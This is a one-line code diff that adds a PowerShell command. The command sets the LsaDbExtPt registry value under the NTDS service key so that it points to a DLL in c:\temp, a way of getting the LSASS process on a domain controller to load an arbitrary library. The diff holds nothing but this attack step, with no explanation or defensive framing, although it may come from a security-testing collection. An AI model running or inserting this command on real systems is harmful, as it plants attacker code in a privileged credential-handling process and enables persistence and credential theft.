@@ -1,0 +1,1 @@
+New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll"
